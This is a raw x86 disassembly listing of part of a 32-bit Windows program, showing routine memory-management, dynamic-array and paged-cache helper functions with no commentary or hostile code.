  405b7a:	int3   
  405b7b:	int3   
  405b7c:	int3   
  405b7d:	int3   
  405b7e:	int3   
  405b7f:	int3   
  405b80:	push   ebp
  405b81:	mov    ebp,esp
  405b83:	push   ecx
  405b84:	push   esi
  405b85:	mov    edx,ecx
  405b87:	mov    ecx,DWORD PTR ds:0x40e430
  405b8d:	lea    esi,[ebp-0x4]
  405b90:	mov    eax,DWORD PTR [ecx]
  405b92:	push   esi
  405b93:	push   edx
  405b94:	call   DWORD PTR [eax+0x38]
  405b97:	test   eax,eax
  405b99:	je     0x405bd2
  405b9b:	mov    eax,DWORD PTR [ebp-0x4]
  405b9e:	cmp    WORD PTR [eax],0x3f
  405ba2:	jne    0x405ba7
  405ba4:	add    eax,0x2
  405ba7:	movzx  eax,WORD PTR [eax]
  405baa:	mov    ecx,0xff
  405baf:	cmp    ax,cx
  405bb2:	jbe    0x405bbf
  405bb4:	shr    ax,0xc
  405bb8:	sub    al,0x1a
  405bba:	pop    esi
  405bbb:	mov    esp,ebp
  405bbd:	pop    ebp
  405bbe:	ret    
  405bbf:	cmp    eax,0x41
  405bc2:	jb     0x405bcd
  405bc4:	cmp    eax,0x5a
  405bc7:	ja     0x405bcb
  405bc9:	add    al,0x20
  405bcb:	add    al,0xe6
  405bcd:	pop    esi
  405bce:	mov    esp,ebp
  405bd0:	pop    ebp
  405bd1:	ret    
  405bd2:	push   0x0
  405bd4:	mov    edx,0x4010c0
  405bd9:	mov    ecx,0x5e5
  405bde:	call   0x407010
  405be3:	int3   
  405be4:	int3   
  405be5:	int3   
  405be6:	int3   
  405be7:	int3   
  405be8:	int3   
  405be9:	int3   
  405bea:	int3   
  405beb:	int3   
  405bec:	int3   
  405bed:	int3   
  405bee:	int3   
  405bef:	int3   
  405bf0:	push   ebp
  405bf1:	mov    ebp,esp
  405bf3:	sub    esp,0xc
  405bf6:	push   ebx
  405bf7:	mov    ebx,ecx
  405bf9:	push   esi
  405bfa:	mov    ecx,DWORD PTR [ebx]
  405bfc:	push   edi
  405bfd:	test   ecx,ecx
  405bff:	je     0x405c1e
  405c01:	mov    esi,DWORD PTR [ecx]
  405c03:	cmp    esi,0x14
  405c06:	jl     0x405c20
  405c08:	mov    eax,0x66666667
  405c0d:	imul   esi
  405c0f:	sar    edx,1
  405c11:	mov    eax,edx
  405c13:	shr    eax,0x1f
  405c16:	inc    eax
  405c17:	add    eax,edx
  405c19:	lea    eax,[eax+eax*4]
  405c1c:	jmp    0x405c22
  405c1e:	xor    esi,esi
  405c20:	mov    eax,esi
  405c22:	lea    edi,[esi+0x1]
  405c25:	cmp    edi,eax
  405c27:	jl     0x405cd4
  405c2d:	test   ecx,ecx
  405c2f:	je     0x405c95
  405c31:	cmp    edi,0x14
  405c34:	jge    0x405c3b
  405c36:	mov    DWORD PTR [ebp-0x4],edi
  405c39:	jmp    0x405c52
  405c3b:	mov    eax,0x66666667
  405c40:	imul   edi
  405c42:	sar    edx,1
  405c44:	mov    eax,edx
  405c46:	shr    eax,0x1f
  405c49:	inc    eax
  405c4a:	add    eax,edx
  405c4c:	lea    eax,[eax+eax*4]
  405c4f:	mov    DWORD PTR [ebp-0x4],eax
  405c52:	cmp    esi,0x14
  405c55:	jge    0x405c5e
  405c57:	mov    edx,esi
  405c59:	mov    DWORD PTR [ebp-0x8],esi
  405c5c:	jmp    0x405c75
  405c5e:	mov    eax,0x66666667
  405c63:	imul   esi
  405c65:	sar    edx,1
  405c67:	mov    eax,edx
  405c69:	inc    edx
  405c6a:	shr    eax,0x1f
  405c6d:	add    eax,edx
  405c6f:	lea    edx,[eax+eax*4]
  405c72:	mov    DWORD PTR [ebp-0x8],edx
  405c75:	mov    eax,DWORD PTR [ebp-0x4]
  405c78:	shl    eax,0x3
  405c7b:	sub    eax,DWORD PTR [ebp-0x4]
  405c7e:	shl    edx,0x3
  405c81:	sub    edx,DWORD PTR [ebp-0x8]
  405c84:	add    eax,0x4
  405c87:	push   eax
  405c88:	add    edx,0x4
  405c8b:	call   0x40ca40
  405c90:	add    esp,0x4
  405c93:	jmp    0x405cc3
  405c95:	cmp    edi,0x14
  405c98:	jge    0x405c9e
  405c9a:	mov    eax,edi
  405c9c:	jmp    0x405cb2
  405c9e:	mov    eax,0x66666667
  405ca3:	imul   edi
  405ca5:	sar    edx,1
  405ca7:	mov    eax,edx
  405ca9:	shr    eax,0x1f
  405cac:	inc    eax
  405cad:	add    eax,edx
  405caf:	lea    eax,[eax+eax*4]
  405cb2:	lea    ecx,[eax*8+0x0]
  405cb9:	sub    ecx,eax
  405cbb:	add    ecx,0x4
  405cbe:	call   0x40c980
  405cc3:	mov    ecx,eax
  405cc5:	test   ecx,ecx
  405cc7:	jne    0x405cd2
  405cc9:	pop    edi
  405cca:	pop    esi
  405ccb:	pop    ebx
  405ccc:	mov    esp,ebp
  405cce:	pop    ebp
  405ccf:	ret    0x8
  405cd2:	mov    DWORD PTR [ebx],ecx
  405cd4:	lea    eax,[esi*8+0x0]
  405cdb:	sub    eax,esi
  405cdd:	add    ecx,eax
  405cdf:	mov    eax,DWORD PTR [ebp+0x8]
  405ce2:	mov    DWORD PTR [ecx+0x4],eax
  405ce5:	mov    ax,WORD PTR [ebp+0xc]
  405ce9:	mov    WORD PTR [ecx+0x8],ax
  405ced:	mov    al,BYTE PTR [ebp+0xe]
  405cf0:	mov    BYTE PTR [ecx+0xa],al
  405cf3:	mov    eax,DWORD PTR [ebx]
  405cf5:	mov    DWORD PTR [eax],edi
  405cf7:	pop    edi
  405cf8:	pop    esi
  405cf9:	mov    eax,0x1
  405cfe:	pop    ebx
  405cff:	mov    esp,ebp
  405d01:	pop    ebp
  405d02:	ret    0x8
  405d05:	int3   
  405d06:	int3   
  405d07:	int3   
  405d08:	int3   
  405d09:	int3   
  405d0a:	int3   
  405d0b:	int3   
  405d0c:	int3   
  405d0d:	int3   
  405d0e:	int3   
  405d0f:	int3   
  405d10:	push   ebp
  405d11:	mov    ebp,esp
  405d13:	sub    esp,0x8
  405d16:	push   ebx
  405d17:	mov    ebx,ecx
  405d19:	push   esi
  405d1a:	mov    ecx,DWORD PTR [ebx]
  405d1c:	push   edi
  405d1d:	test   ecx,ecx
  405d1f:	je     0x405d3e
  405d21:	mov    esi,DWORD PTR [ecx]
  405d23:	cmp    esi,0x14
  405d26:	jl     0x405d40
  405d28:	mov    eax,0x66666667
  405d2d:	imul   esi
  405d2f:	sar    edx,1
  405d31:	mov    eax,edx
  405d33:	shr    eax,0x1f
  405d36:	inc    eax
  405d37:	add    eax,edx
  405d39:	lea    eax,[eax+eax*4]
  405d3c:	jmp    0x405d42
  405d3e:	xor    esi,esi
  405d40:	mov    eax,esi
  405d42:	lea    edi,[esi+0x1]
  405d45:	cmp    edi,eax
  405d47:	jl     0x405de5
  405d4d:	test   ecx,ecx
  405d4f:	je     0x405dab
  405d51:	cmp    edi,0x14
  405d54:	jge    0x405d5b
  405d56:	mov    DWORD PTR [ebp-0x4],edi
  405d59:	jmp    0x405d72
  405d5b:	mov    eax,0x66666667
  405d60:	imul   edi
  405d62:	sar    edx,1
  405d64:	mov    eax,edx
  405d66:	shr    eax,0x1f
  405d69:	inc    eax
  405d6a:	add    eax,edx
  405d6c:	lea    eax,[eax+eax*4]
  405d6f:	mov    DWORD PTR [ebp-0x4],eax
  405d72:	cmp    esi,0x14
  405d75:	jge    0x405d7b
  405d77:	mov    edx,esi
  405d79:	jmp    0x405d8f
  405d7b:	mov    eax,0x66666667
  405d80:	imul   esi
  405d82:	sar    edx,1
  405d84:	mov    eax,edx
  405d86:	inc    edx
  405d87:	shr    eax,0x1f
  405d8a:	add    eax,edx
  405d8c:	lea    edx,[eax+eax*4]
  405d8f:	mov    eax,DWORD PTR [ebp-0x4]
  405d92:	lea    edx,[edx*4+0x4]
  405d99:	lea    eax,[eax*4+0x4]
  405da0:	push   eax
  405da1:	call   0x40cce0
  405da6:	add    esp,0x4
  405da9:	jmp    0x405dd4
  405dab:	cmp    edi,0x14
  405dae:	jge    0x405db4
  405db0:	mov    ecx,edi
  405db2:	jmp    0x405dc8
  405db4:	mov    eax,0x66666667
  405db9:	imul   edi
  405dbb:	sar    edx,1
  405dbd:	mov    eax,edx
  405dbf:	shr    eax,0x1f
  405dc2:	inc    eax
  405dc3:	add    eax,edx
  405dc5:	lea    ecx,[eax+eax*4]
  405dc8:	lea    ecx,[ecx*4+0x4]
  405dcf:	call   0x40cc20
  405dd4:	mov    ecx,eax
  405dd6:	test   ecx,ecx
  405dd8:	jne    0x405de3
  405dda:	pop    edi
  405ddb:	pop    esi
  405ddc:	pop    ebx
  405ddd:	mov    esp,ebp
  405ddf:	pop    ebp
  405de0:	ret    0x4
  405de3:	mov    DWORD PTR [ebx],ecx
  405de5:	mov    eax,DWORD PTR [ebp+0x8]
  405de8:	mov    DWORD PTR [ecx+esi*4+0x4],eax
  405dec:	mov    eax,DWORD PTR [ebx]
  405dee:	mov    DWORD PTR [eax],edi
  405df0:	pop    edi
  405df1:	pop    esi
  405df2:	mov    eax,0x1
  405df7:	pop    ebx
  405df8:	mov    esp,ebp
  405dfa:	pop    ebp
  405dfb:	ret    0x4
  405dfe:	int3   
  405dff:	int3   
  405e00:	push   ebp
  405e01:	mov    ebp,esp
  405e03:	sub    esp,0x8
  405e06:	push   ebx
  405e07:	mov    ebx,ecx
  405e09:	push   esi
  405e0a:	mov    ecx,DWORD PTR [ebx]
  405e0c:	push   edi
  405e0d:	test   ecx,ecx
  405e0f:	je     0x405e2e
  405e11:	mov    esi,DWORD PTR [ecx]
  405e13:	cmp    esi,0x14
  405e16:	jl     0x405e30
  405e18:	mov    eax,0x66666667
  405e1d:	imul   esi
  405e1f:	sar    edx,1
  405e21:	mov    eax,edx
  405e23:	shr    eax,0x1f
  405e26:	inc    eax
  405e27:	add    eax,edx
  405e29:	lea    eax,[eax+eax*4]
  405e2c:	jmp    0x405e32
  405e2e:	xor    esi,esi
  405e30:	mov    eax,esi
  405e32:	lea    edi,[esi+0x1]
  405e35:	cmp    edi,eax
  405e37:	jl     0x405ed5
  405e3d:	test   ecx,ecx
  405e3f:	je     0x405e9b
  405e41:	cmp    edi,0x14
  405e44:	jge    0x405e4b
  405e46:	mov    DWORD PTR [ebp-0x4],edi
  405e49:	jmp    0x405e62
  405e4b:	mov    eax,0x66666667
  405e50:	imul   edi
  405e52:	sar    edx,1
  405e54:	mov    eax,edx
  405e56:	shr    eax,0x1f
  405e59:	inc    eax
  405e5a:	add    eax,edx
  405e5c:	lea    eax,[eax+eax*4]
  405e5f:	mov    DWORD PTR [ebp-0x4],eax
  405e62:	cmp    esi,0x14
  405e65:	jge    0x405e6b
  405e67:	mov    edx,esi
  405e69:	jmp    0x405e7f
  405e6b:	mov    eax,0x66666667
  405e70:	imul   esi
  405e72:	sar    edx,1
  405e74:	mov    eax,edx
  405e76:	inc    edx
  405e77:	shr    eax,0x1f
  405e7a:	add    eax,edx
  405e7c:	lea    edx,[eax+eax*4]
  405e7f:	mov    eax,DWORD PTR [ebp-0x4]
  405e82:	lea    edx,[edx*4+0x4]
  405e89:	lea    eax,[eax*4+0x4]
  405e90:	push   eax
  405e91:	call   0x40cb90
  405e96:	add    esp,0x4
  405e99:	jmp    0x405ec4
  405e9b:	cmp    edi,0x14
  405e9e:	jge    0x405ea4
  405ea0:	mov    ecx,edi
  405ea2:	jmp    0x405eb8
  405ea4:	mov    eax,0x66666667
  405ea9:	imul   edi
  405eab:	sar    edx,1
  405ead:	mov    eax,edx
  405eaf:	shr    eax,0x1f
  405eb2:	inc    eax
  405eb3:	add    eax,edx
  405eb5:	lea    ecx,[eax+eax*4]
  405eb8:	lea    ecx,[ecx*4+0x4]
  405ebf:	call   0x40cad0
  405ec4:	mov    ecx,eax
  405ec6:	test   ecx,ecx
  405ec8:	jne    0x405ed3
  405eca:	pop    edi
  405ecb:	pop    esi
  405ecc:	pop    ebx
  405ecd:	mov    esp,ebp
  405ecf:	pop    ebp
  405ed0:	ret    0x4
  405ed3:	mov    DWORD PTR [ebx],ecx
  405ed5:	mov    eax,DWORD PTR [ebp+0x8]
  405ed8:	mov    DWORD PTR [ecx+esi*4+0x4],eax
  405edc:	mov    eax,DWORD PTR [ebx]
  405ede:	mov    DWORD PTR [eax],edi
  405ee0:	pop    edi
  405ee1:	pop    esi
  405ee2:	mov    eax,0x1
  405ee7:	pop    ebx
  405ee8:	mov    esp,ebp
  405eea:	pop    ebp
  405eeb:	ret    0x4
  405eee:	int3   
  405eef:	int3   
  405ef0:	push   ebp
  405ef1:	mov    ebp,esp
  405ef3:	push   ecx
  405ef4:	push   ebx
  405ef5:	mov    ebx,ecx
  405ef7:	push   esi
  405ef8:	mov    ecx,DWORD PTR [ebx]
  405efa:	push   edi
  405efb:	test   ecx,ecx
  405efd:	je     0x405f1c
  405eff:	mov    esi,DWORD PTR [ecx]
  405f01:	cmp    esi,0x14
  405f04:	jl     0x405f1e
  405f06:	mov    eax,0x66666667
  405f0b:	imul   esi
  405f0d:	sar    edx,1
  405f0f:	mov    eax,edx
  405f11:	shr    eax,0x1f
  405f14:	inc    eax
  405f15:	add    eax,edx
  405f17:	lea    eax,[eax+eax*4]
  405f1a:	jmp    0x405f20
  405f1c:	xor    esi,esi
  405f1e:	mov    eax,esi
  405f20:	lea    edi,[esi+0x1]
  405f23:	cmp    edi,eax
  405f25:	jl     0x405fcc
  405f2b:	test   ecx,ecx
  405f2d:	je     0x405f8f
  405f2f:	cmp    edi,0x14
  405f32:	jge    0x405f39
  405f34:	mov    DWORD PTR [ebp-0x4],edi
  405f37:	jmp    0x405f50
  405f39:	mov    eax,0x66666667
  405f3e:	imul   edi
  405f40:	sar    edx,1
  405f42:	mov    eax,edx
  405f44:	shr    eax,0x1f
  405f47:	inc    eax
  405f48:	add    eax,edx
  405f4a:	lea    eax,[eax+eax*4]
  405f4d:	mov    DWORD PTR [ebp-0x4],eax
  405f50:	cmp    esi,0x14
  405f53:	jge    0x405f59
  405f55:	mov    edx,esi
  405f57:	jmp    0x405f6d
  405f59:	mov    eax,0x66666667
  405f5e:	imul   esi
  405f60:	sar    edx,1
  405f62:	mov    eax,edx
  405f64:	inc    edx
  405f65:	shr    eax,0x1f
  405f68:	add    eax,edx
  405f6a:	lea    edx,[eax+eax*4]
  405f6d:	mov    eax,DWORD PTR [ebp-0x4]
  405f70:	lea    eax,[eax+eax*2]
  405f73:	lea    eax,[eax*2+0x4]
  405f7a:	push   eax
  405f7b:	lea    eax,[edx+edx*2]
  405f7e:	lea    edx,[eax*2+0x4]
  405f85:	call   0x40ca40
  405f8a:	add    esp,0x4
  405f8d:	jmp    0x405fbb
  405f8f:	cmp    edi,0x14
  405f92:	jge    0x405f98
  405f94:	mov    eax,edi
  405f96:	jmp    0x405fac
  405f98:	mov    eax,0x66666667
  405f9d:	imul   edi
  405f9f:	sar    edx,1
  405fa1:	mov    eax,edx
  405fa3:	shr    eax,0x1f
  405fa6:	inc    eax
  405fa7:	add    eax,edx
  405fa9:	lea    eax,[eax+eax*4]
  405fac:	lea    eax,[eax+eax*2]
  405faf:	lea    ecx,[eax*2+0x4]
  405fb6:	call   0x40c980
  405fbb:	mov    ecx,eax
  405fbd:	test   ecx,ecx
  405fbf:	jne    0x405fca
  405fc1:	pop    edi
  405fc2:	pop    esi
  405fc3:	pop    ebx
  405fc4:	mov    esp,ebp
  405fc6:	pop    ebp
  405fc7:	ret    0x8
  405fca:	mov    DWORD PTR [ebx],ecx
  405fcc:	lea    eax,[esi+esi*2]
  405fcf:	lea    ecx,[ecx+eax*2]
  405fd2:	mov    eax,DWORD PTR [ebp+0x8]
  405fd5:	mov    DWORD PTR [ecx+0x4],eax
  405fd8:	mov    ax,WORD PTR [ebp+0xc]
  405fdc:	mov    WORD PTR [ecx+0x8],ax
  405fe0:	mov    eax,DWORD PTR [ebx]
  405fe2:	mov    DWORD PTR [eax],edi
  405fe4:	pop    edi
  405fe5:	pop    esi
  405fe6:	mov    eax,0x1
  405feb:	pop    ebx
  405fec:	mov    esp,ebp
  405fee:	pop    ebp
  405fef:	ret    0x8
  405ff2:	int3   
  405ff3:	int3   
  405ff4:	int3   
  405ff5:	int3   
  405ff6:	int3   
  405ff7:	int3   
  405ff8:	int3   
  405ff9:	int3   
  405ffa:	int3   
  405ffb:	int3   
  405ffc:	int3   
  405ffd:	int3   
  405ffe:	int3   
  405fff:	int3   
  406000:	push   esi
  406001:	mov    esi,ecx
  406003:	call   0x406650
  406008:	mov    ecx,DWORD PTR [esi]
  40600a:	test   ecx,ecx
  40600c:	je     0x406043
  40600e:	mov    edx,DWORD PTR [esi+0x8]
  406011:	shl    edx,0x2
  406014:	cmp    edx,0x200
  40601a:	jl     0x406029
  40601c:	call   0x40c970
  406021:	mov    DWORD PTR [esi],0x0
  406027:	pop    esi
  406028:	ret    
  406029:	cmp    edx,0x4
  40602c:	jae    0x406033
  40602e:	mov    edx,0x4
  406033:	mov    eax,DWORD PTR [edx*4+0x422378]
  40603a:	mov    DWORD PTR [ecx],eax
  40603c:	mov    DWORD PTR [edx*4+0x422378],ecx
  406043:	mov    DWORD PTR [esi],0x0
  406049:	pop    esi
  40604a:	ret    
  40604b:	int3   
  40604c:	int3   
  40604d:	int3   
  40604e:	int3   
  40604f:	int3   
  406050:	push   esi
  406051:	mov    esi,ecx
  406053:	mov    ecx,DWORD PTR [esi]
  406055:	test   ecx,ecx
  406057:	je     0x4060aa
  406059:	mov    edx,DWORD PTR [ecx]
  40605b:	cmp    edx,0x14
  40605e:	jl     0x406074
  406060:	mov    eax,0x66666667
  406065:	imul   edx
  406067:	sar    edx,1
  406069:	mov    eax,edx
  40606b:	inc    edx
  40606c:	shr    eax,0x1f
  40606f:	add    eax,edx
  406071:	lea    edx,[eax+eax*4]
  406074:	lea    edx,[edx*4+0x4]
  40607b:	cmp    edx,0x200
  406081:	jl     0x406090
  406083:	call   0x40c970
  406088:	mov    DWORD PTR [esi],0x0
  40608e:	pop    esi
  40608f:	ret    
  406090:	cmp    edx,0x4
  406093:	jae    0x40609a
  406095:	mov    edx,0x4
  40609a:	mov    eax,DWORD PTR [edx*4+0x420b78]
  4060a1:	mov    DWORD PTR [ecx],eax
  4060a3:	mov    DWORD PTR [edx*4+0x420b78],ecx
  4060aa:	mov    DWORD PTR [esi],0x0
  4060b0:	pop    esi
  4060b1:	ret    
  4060b2:	int3   
  4060b3:	int3   
  4060b4:	int3   
  4060b5:	int3   
  4060b6:	int3   
  4060b7:	int3   
  4060b8:	int3   
  4060b9:	int3   
  4060ba:	int3   
  4060bb:	int3   
  4060bc:	int3   
  4060bd:	int3   
  4060be:	int3   
  4060bf:	int3   
  4060c0:	push   ebp
  4060c1:	mov    ebp,esp
  4060c3:	sub    esp,0x8
  4060c6:	push   ebx
  4060c7:	mov    ebx,ecx
  4060c9:	push   esi
  4060ca:	mov    ecx,DWORD PTR [ebx]
  4060cc:	push   edi
  4060cd:	test   ecx,ecx
  4060cf:	je     0x4060ee
  4060d1:	mov    esi,DWORD PTR [ecx]
  4060d3:	cmp    esi,0x14
  4060d6:	jl     0x4060f0
  4060d8:	mov    eax,0x66666667
  4060dd:	imul   esi
  4060df:	sar    edx,1
  4060e1:	mov    eax,edx
  4060e3:	shr    eax,0x1f
  4060e6:	inc    eax
  4060e7:	add    eax,edx
  4060e9:	lea    eax,[eax+eax*4]
  4060ec:	jmp    0x4060f2
  4060ee:	xor    esi,esi
  4060f0:	mov    eax,esi
  4060f2:	lea    edi,[esi+0x1]
  4060f5:	cmp    edi,eax
  4060f7:	jl     0x406195
  4060fd:	test   ecx,ecx
  4060ff:	je     0x40615b
  406101:	cmp    edi,0x14
  406104:	jge    0x40610b
  406106:	mov    DWORD PTR [ebp-0x4],edi
  406109:	jmp    0x406122
  40610b:	mov    eax,0x66666667
  406110:	imul   edi
  406112:	sar    edx,1
  406114:	mov    eax,edx
  406116:	shr    eax,0x1f
  406119:	inc    eax
  40611a:	add    eax,edx
  40611c:	lea    eax,[eax+eax*4]
  40611f:	mov    DWORD PTR [ebp-0x4],eax
  406122:	cmp    esi,0x14
  406125:	jge    0x40612b
  406127:	mov    edx,esi
  406129:	jmp    0x40613f
  40612b:	mov    eax,0x66666667
  406130:	imul   esi
  406132:	sar    edx,1
  406134:	mov    eax,edx
  406136:	inc    edx
  406137:	shr    eax,0x1f
  40613a:	add    eax,edx
  40613c:	lea    edx,[eax+eax*4]
  40613f:	mov    eax,DWORD PTR [ebp-0x4]
  406142:	lea    edx,[edx*4+0x4]
  406149:	lea    eax,[eax*4+0x4]
  406150:	push   eax
  406151:	call   0x40d070
  406156:	add    esp,0x4
  406159:	jmp    0x406184
  40615b:	cmp    edi,0x14
  40615e:	jge    0x406164
  406160:	mov    ecx,edi
  406162:	jmp    0x406178
  406164:	mov    eax,0x66666667
  406169:	imul   edi
  40616b:	sar    edx,1
  40616d:	mov    eax,edx
  40616f:	shr    eax,0x1f
  406172:	inc    eax
  406173:	add    eax,edx
  406175:	lea    ecx,[eax+eax*4]
  406178:	lea    ecx,[ecx*4+0x4]
  40617f:	call   0x40cfb0
  406184:	mov    ecx,eax
  406186:	test   ecx,ecx
  406188:	jne    0x406193
  40618a:	pop    edi
  40618b:	pop    esi
  40618c:	pop    ebx
  40618d:	mov    esp,ebp
  40618f:	pop    ebp
  406190:	ret    0x4
  406193:	mov    DWORD PTR [ebx],ecx
  406195:	mov    eax,DWORD PTR [ebp+0x8]
  406198:	mov    DWORD PTR [ecx+esi*4+0x4],eax
  40619c:	mov    eax,DWORD PTR [ebx]
  40619e:	mov    DWORD PTR [eax],edi
  4061a0:	pop    edi
  4061a1:	pop    esi
  4061a2:	mov    eax,0x1
  4061a7:	pop    ebx
  4061a8:	mov    esp,ebp
  4061aa:	pop    ebp
  4061ab:	ret    0x4
  4061ae:	int3   
  4061af:	int3   
  4061b0:	push   esi
  4061b1:	mov    esi,ecx
  4061b3:	mov    ecx,0x8000
  4061b8:	mov    DWORD PTR [esi+0x4],0x0
  4061bf:	mov    DWORD PTR [esi+0xc],0x4021d0
  4061c6:	mov    DWORD PTR [esi+0x8],0x2000
  4061cd:	mov    DWORD PTR [esi],0x0
  4061d3:	call   0x40cd70
  4061d8:	mov    DWORD PTR [esi],eax
  4061da:	mov    eax,esi
  4061dc:	pop    esi
  4061dd:	ret    0x8
  4061e0:	push   ebp
  4061e1:	mov    ebp,esp
  4061e3:	push   ecx
  4061e4:	push   esi
  4061e5:	mov    esi,ecx
  4061e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4061ea:	push   edi
  4061eb:	mov    edi,DWORD PTR [ebp+0x8]
  4061ee:	mov    DWORD PTR [esi+0xe0c],0x0
  4061f8:	mov    DWORD PTR [esi],edi
  4061fa:	mov    DWORD PTR [esi+0x8],ecx
  4061fd:	mov    DWORD PTR [esi+0x4],0x0
  406204:	cmp    ecx,0x200
  40620a:	jle    0x406211
  40620c:	mov    ecx,0x200
  406211:	lea    eax,[ecx*8+0x0]
  406218:	sub    eax,ecx
  40621a:	mov    DWORD PTR [ebp+0x8],eax
  40621d:	mov    edx,DWORD PTR [edi]
  40621f:	lea    eax,[ebp+0x8]
  406222:	push   eax
  406223:	lea    eax,[esi+0xc]
  406226:	push   eax
  406227:	push   0x0
  406229:	mov    ecx,edi
  40622b:	call   DWORD PTR [edx+0x4]
  40622e:	test   eax,eax
  406230:	je     0x40623b
  406232:	pop    edi
  406233:	mov    eax,esi
  406235:	pop    esi
  406236:	pop    ecx
  406237:	pop    ebp
  406238:	ret    0xc
  40623b:	call   0x402190
  406240:	int3   
  406241:	int3   
  406242:	int3   
  406243:	int3   
  406244:	int3   
  406245:	int3   
  406246:	int3   
  406247:	int3   
  406248:	int3   
  406249:	int3   
  40624a:	int3   
  40624b:	int3   
  40624c:	int3   
  40624d:	int3   
  40624e:	int3   
  40624f:	int3   
  406250:	push   ebp
  406251:	mov    ebp,esp
  406253:	push   ebx
  406254:	push   esi
  406255:	mov    esi,DWORD PTR [ebp+0x8]
  406258:	mov    ebx,esi
  40625a:	push   edi
  40625b:	mov    edi,ecx
  40625d:	and    ebx,0x800001ff
  406263:	jns    0x40626d
  406265:	dec    ebx
  406266:	or     ebx,0xfffffe00
  40626c:	inc    ebx
  40626d:	mov    eax,DWORD PTR [edi+0x4]
  406270:	cmp    esi,eax
  406272:	jl     0x40627d
  406274:	add    eax,0x200
  406279:	cmp    esi,eax
  40627b:	jl     0x4062c3
  40627d:	mov    ecx,DWORD PTR [edi+0x8]
  406280:	sub    esi,ebx
  406282:	sub    ecx,esi
  406284:	mov    DWORD PTR [edi+0x4],esi
  406287:	cmp    ecx,0x200
  40628d:	jle    0x406294
  40628f:	mov    ecx,0x200
  406294:	lea    eax,[ecx*8+0x0]
  40629b:	sub    eax,ecx
  40629d:	mov    ecx,DWORD PTR [edi]
  40629f:	mov    DWORD PTR [ebp+0x8],eax
  4062a2:	mov    edx,DWORD PTR [ecx]
  4062a4:	lea    eax,[ebp+0x8]
  4062a7:	push   eax
  4062a8:	lea    eax,[edi+0xc]
  4062ab:	push   eax
  4062ac:	lea    eax,[esi*8+0x0]
  4062b3:	sub    eax,esi
  4062b5:	add    eax,DWORD PTR [edi+0xe0c]
  4062bb:	push   eax
  4062bc:	call   DWORD PTR [edx+0x4]
  4062bf:	test   eax,eax
  4062c1:	je     0x4062d8
  4062c3:	lea    eax,[ebx*8+0x0]
  4062ca:	sub    eax,ebx
  4062cc:	add    eax,0xc
  4062cf:	add    eax,edi
  4062d1:	pop    edi
  4062d2:	pop    esi
  4062d3:	pop    ebx
  4062d4:	pop    ebp
  4062d5:	ret    0x4
  4062d8:	call   0x402190
  4062dd:	int3   
  4062de:	int3   
  4062df:	int3   
  4062e0:	push   ebp
  4062e1:	mov    ebp,esp
  4062e3:	push   ecx
  4062e4:	mov    eax,DWORD PTR [ebp+0x10]
  4062e7:	push   esi
  4062e8:	mov    esi,ecx
  4062ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4062ed:	push   edi
  4062ee:	mov    edi,DWORD PTR [ebp+0xc]
  4062f1:	mov    DWORD PTR [esi+0x160c],edi
  4062f7:	mov    DWORD PTR [esi],ecx
  4062f9:	mov    DWORD PTR [esi+0x8],eax
  4062fc:	mov    DWORD PTR [esi+0x4],0x0
  406303:	cmp    eax,0x200
  406308:	jle    0x40630f
  40630a:	mov    eax,0x200
  40630f:	imul   eax,eax,0xb
  406312:	mov    DWORD PTR [ebp+0xc],eax
  406315:	mov    edx,DWORD PTR [ecx]
  406317:	lea    eax,[ebp+0xc]
  40631a:	push   eax
  40631b:	lea    eax,[esi+0xc]
  40631e:	push   eax
  40631f:	push   edi
  406320:	call   DWORD PTR [edx+0x4]
  406323:	test   eax,eax
  406325:	je     0x406330
  406327:	pop    edi
  406328:	mov    eax,esi
  40632a:	pop    esi
  40632b:	pop    ecx
  40632c:	pop    ebp
  40632d:	ret    0xc
  406330:	call   0x402190
  406335:	int3   
  406336:	int3   
  406337:	int3   
  406338:	int3   
  406339:	int3   
  40633a:	int3   
  40633b:	int3   
  40633c:	int3   
  40633d:	int3   
  40633e:	int3   
  40633f:	int3   
  406340:	push   ebp
  406341:	mov    ebp,esp
  406343:	push   ebx
  406344:	push   esi
  406345:	mov    esi,DWORD PTR [ebp+0x8]
  406348:	push   edi
  406349:	mov    edi,esi
  40634b:	mov    ebx,ecx
  40634d:	and    edi,0x800001ff
  406353:	jns    0x40635d
  406355:	dec    edi
  406356:	or     edi,0xfffffe00
  40635c:	inc    edi
  40635d:	mov    eax,DWORD PTR [ebx+0x4]
  406360:	cmp    esi,eax
  406362:	jl     0x40636d
  406364:	add    eax,0x200
  406369:	cmp    esi,eax
  40636b:	jl     0x4063a6
  40636d:	mov    eax,DWORD PTR [ebx+0x8]
  406370:	sub    esi,edi
  406372:	sub    eax,esi
  406374:	mov    DWORD PTR [ebx+0x4],esi
  406377:	cmp    eax,0x200
  40637c:	jle    0x406383
  40637e:	mov    eax,0x200
  406383:	mov    ecx,DWORD PTR [ebx]
  406385:	imul   eax,eax,0xb
  406388:	imul   esi,esi,0xb
  40638b:	add    esi,DWORD PTR [ebx+0x160c]
  406391:	mov    DWORD PTR [ebp+0x8],eax
  406394:	mov    edx,DWORD PTR [ecx]
  406396:	lea    eax,[ebp+0x8]
  406399:	push   eax
  40639a:	lea    eax,[ebx+0xc]
  40639d:	push   eax
  40639e:	push   esi
  40639f:	call   DWORD PTR [edx+0x4]
  4063a2:	test   eax,eax
  4063a4:	je     0x4063b5
  4063a6:	imul   edi,edi,0xb
  4063a9:	lea    eax,[ebx+0xc]
  4063ac:	add    eax,edi
  4063ae:	pop    edi
  4063af:	pop    esi
  4063b0:	pop    ebx
  4063b1:	pop    ebp
  4063b2:	ret    0x4
  4063b5:	call   0x402190
  4063ba:	int3   
  4063bb:	int3   
  4063bc:	int3   
  4063bd:	int3   
  4063be:	int3   
  4063bf:	int3   
  4063c0:	test   ecx,ecx
  4063c2:	je     0x4063d3
  4063c4:	push   ecx
  4063c5:	push   0x0
  4063c7:	push   DWORD PTR ds:0x40e648
  4063cd:	call   DWORD PTR ds:0x4242c0
  4063d3:	ret    
  4063d4:	int3   
  4063d5:	int3   
  4063d6:	int3   
  4063d7:	int3   
  4063d8:	int3   
  4063d9:	int3   
  4063da:	int3   
  4063db:	int3   
  4063dc:	int3   
  4063dd:	int3   
  4063de:	int3   
  4063df:	int3   
  4063e0:	mov    DWORD PTR [ecx+0xc],0xffffffff
  4063e7:	mov    DWORD PTR [ecx+0x8],0x0
  4063ee:	ret    
  4063ef:	int3   
  4063f0:	mov    eax,DWORD PTR [ecx+0x8]
  4063f3:	test   eax,eax
  4063f5:	je     0x4063fc
